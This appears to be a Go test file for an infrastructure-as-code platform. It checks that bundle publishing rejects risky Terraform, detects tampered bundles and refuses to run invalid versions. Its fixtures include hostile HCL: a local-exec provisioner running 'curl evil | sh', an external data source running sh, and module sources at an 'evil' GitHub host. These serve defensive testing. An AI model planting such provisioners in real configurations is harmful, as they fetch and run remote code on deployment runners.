package handlers

import (
	"bytes"
	"errors"
	"log"
	"net/http"
	"os"
	"strings"
	"testing"

	"iac-platform/internal/manifestbundle"
	"iac-platform/services"
)

// Native publish runs the HCL static check (provisioners, data external /
// http, module source allowlist): 422 bundle_rules_violated with file + line,
// no version created, no content echoed.
func TestPublish_HCLRulesRejectedWithLine(t *testing.T) {
	e := newBundleEnv(t)
	e.putDraft(t, "u1", "main.tf", "resource \"null_resource\" \"a\" {\n  provisioner \"local-exec\" {\n    command = \"curl evil | sh\"\n  }\n}\n")
	e.putDraft(t, "u1", "data.tf", "\ndata \"external\" \"x\" {\n  program = [\"sh\"]\n}\n")
	e.putDraft(t, "u1", "mods.tf", "module \"vpc\" {\n  source = \"git::https://github.com/evil/mods.git?ref=0123456789abcdef0123456789abcdef01234567\"\n}\n")
	e.putDraft(t, "u1", "unpinned.tf", "module \"vpc2\" {\n  source = \"git::https://github.com/evil/mods.git?ref=main\"\n}\n")
	e.putDraft(t, "u1", "exec.tf.json", `{"resource":{"terraform_data":{"x":{"provisioner":[{"local-exec":{"command":"id"}}]}}}}`)
	var before int64
	e.db.Table("manifest_versions").Count(&before)
	w := doJSON(e.r, "POST", base+"/v2/versions", `{"version":"v9.0.0"}`)
	if w.Code != http.StatusUnprocessableEntity {
		t.Fatalf("want 422, got %d %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	for _, want := range []string{
		`"code":"bundle_rules_violated"`,
		`{"file":"main.tf","line":2,"rule":"hcl_provisioner"`,
		`{"file":"data.tf","line":2,"rule":"hcl_external_data"`,
		`{"file":"mods.tf","line":2,"rule":"hcl_module_source"`,
		`{"file":"unpinned.tf","line":2,"rule":"hcl_module_unpinned"`,
		`{"file":"exec.tf.json","line":1,"rule":"hcl_provisioner"`,
	} {
		if !strings.Contains(body, want) {
			t.Fatalf("422 body lacks %s: %s", want, body)
		}
	}
	for _, leak := range []string{"curl", "evil", "program"} {
		if strings.Contains(body, leak) {
			t.Fatalf("422 body leaks %q: %s", leak, body)
		}
	}
	var after int64
	e.db.Table("manifest_versions").Count(&after)
	if after != before {
		t.Fatal("rejected publish must not create a version")
	}
}

func TestPublish_UnparsableTFIsRejected(t *testing.T) {
	e := newBundleEnv(t)
	e.putDraft(t, "u1", "main.tf", "resource \"null_resource\" \"a\" {\n  x = \n}\n")
	w := doJSON(e.r, "POST", base+"/v2/versions", `{"version":"v9.0.0"}`)
	if w.Code != http.StatusUnprocessableEntity || !strings.Contains(w.Body.String(), `"rule":"hcl_parse_error"`) {
		t.Fatalf("want 422 hcl_parse_error, got %d %s", w.Code, w.Body.String())
	}
}

// The publish allowlist for non-local module sources is the platform module
// catalog (active modules' module_source and their versions' module_source).
func TestPublish_ModuleSourceAllowlistIsModuleCatalog(t *testing.T) {
	e := newBundleEnv(t)
	for _, stmt := range []string{
		`INSERT INTO modules VALUES (1, 'vpc', 'tf-file-import', 'terraform-aws-modules/vpc/aws', 'active')`,
		`INSERT INTO module_versions VALUES ('mv-1', 1, 'git::https://git.example.com/mods/vpc.git')`,
		`INSERT INTO modules VALUES (2, 'old', 'tf-file-import', 'acme/old/aws', 'archived')`,
	} {
		if err := e.db.Exec(stmt).Error; err != nil {
			t.Fatal(err)
		}
	}
	e.putDraft(t, "u1", "main.tf", `module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "5.0.0"
}
module "vpc_git" {
  source = "git::https://git.example.com/mods/vpc.git//sub?ref=0123456789abcdef0123456789abcdef01234567"
}
module "local" {
  source = "./modules/x"
}
`)
	e.putDraft(t, "u1", "modules/x/main.tf", `resource "null_resource" "x" {}`)
	e.publish(t, "v2.0.0")

	e.putDraft(t, "u1", "main.tf", "module \"old\" {\n  source = \"acme/old/aws\"\n}\n")
	w := doJSON(e.r, "POST", base+"/v2/versions", `{"version":"v2.0.1"}`)
	if w.Code != http.StatusUnprocessableEntity || !strings.Contains(w.Body.String(), `{"file":"main.tf","line":2,"rule":"hcl_module_source"`) {
		t.Fatalf("inactive catalog module must not be allowed: %d %s", w.Code, w.Body.String())
	}
}

// Executor hand-off (LocalDataAccessor.GetManifestFilesByTag): a version
// whose bundle_hash is NULL is never handed to Terraform, whatever the reason.
func TestExecutor_NullBundleFailsWithRepublishRequired(t *testing.T) {
	e := newBundleEnv(t)
	e.putDraft(t, "u1", "main.tf", pubMain)
	id, _ := e.publish(t, "v2.0.0")
	e.db.Exec(`INSERT INTO manifest_deployments (id, manifest_id, version_id, workspace_id, status) VALUES ('mfd-pub', 'mf-1', ?, 'ws-new', 'active')`, id)
	acc := services.NewLocalDataAccessor(e.db)
	if files, err := acc.GetManifestFilesByTag("mfd-pub", "v2.0.0"); err != nil || len(files) != 1 {
		t.Fatalf("valid version: %v %v", files, err)
	}

	// rule violation (bundle_hash NULL + rule reason): plan / apply / drift all fail
	markInvalid(t, e.db, id)
	files, err := acc.GetManifestFilesByTag("mfd-pub", "v2.0.0")
	var rr *manifestbundle.RepublishRequiredError
	if files != nil || !errors.As(err, &rr) || err.Error() != "bundle_republish_required: denylisted_file @ prod.tfvars" {
		t.Fatalf("rule-violation version must be refused: %v %v", files, err)
	}

	// sticky hash_mismatch
	e.db.Exec(`UPDATE manifest_versions SET bundle_hash = NULL, bundle_invalid_reason = 'hash_mismatch' WHERE id = ?`, id)
	if _, err := acc.GetManifestFilesByTag("mfd-pub", "v2.0.0"); err == nil || err.Error() != "bundle_republish_required: hash_mismatch" {
		t.Fatalf("hash_mismatch version must be refused: %v", err)
	}
}

func TestExecutor_TamperedBundleDetectedAndRecorded(t *testing.T) {
	e := newBundleEnv(t)
	e.putDraft(t, "u1", "main.tf", pubMain)
	id, _ := e.publish(t, "v2.0.0")
	e.db.Exec(`INSERT INTO manifest_deployments (id, manifest_id, version_id, workspace_id, status) VALUES ('mfd-pub', 'mf-1', ?, 'ws-new', 'active')`, id)
	e.db.Exec(`UPDATE manifest_files SET content = CAST('resource "null_resource" "evil" {}' AS BLOB) WHERE version_id = ?`, id)
	var logs bytes.Buffer
	log.SetOutput(&logs)
	defer log.SetOutput(os.Stderr)
	_, err := services.NewLocalDataAccessor(e.db).GetManifestFilesByTag("mfd-pub", "v2.0.0")
	if err == nil || err.Error() != "bundle_republish_required: hash_mismatch" {
		t.Fatalf("tampered version: %v", err)
	}
	if h, r := versionRow(t, e.db, id); h != nil || r == nil || *r != "hash_mismatch" {
		t.Fatalf("hash_mismatch not recorded: %v %v", h, r)
	}
	var n int64
	e.db.Table("audit_logs").Where("action = 'version.bundle_hash_mismatch'").Count(&n)
	if n != 1 || !strings.Contains(logs.String(), "source=runner:deployment=mfd-pub") {
		t.Fatalf("audit rows %d, log %q", n, logs.String())
	}
}

// Uninstall stays metadata-only for NULL versions: it unbinds the workspace,
// so the follow-up Plan+Apply no longer loads the (untrusted) bundle at all.
func TestNullBundleHash_UninstallUnbindsSoBundleIsNeverExecuted(t *testing.T) {
	e := newBundleEnv(t)
	markInvalid(t, e.db, "mfv-1")
	w := doJSON(e.r, "POST", base+"/v2/deployments/mfd-a/uninstall", "")
	if w.Code != http.StatusOK {
		t.Fatalf("uninstall: %d %s", w.Code, w.Body.String())
	}
	var ws struct {
		ManifestDeploymentID *string
		ManifestActiveTag    *string
	}
	e.db.Table("workspaces").Select("manifest_deployment_id, manifest_active_tag").Where("workspace_id = 'ws-a'").Take(&ws)
	if ws.ManifestDeploymentID != nil || ws.ManifestActiveTag != nil {
		t.Fatalf("workspace still bound to the manifest: %+v", ws)
	}
	var tasks int64
	if e.db.Migrator().HasTable("workspace_tasks") {
		e.db.Table("workspace_tasks").Count(&tasks)
	}
	if tasks != 0 {
		t.Fatalf("uninstall must not create tasks, got %d", tasks)
	}
}
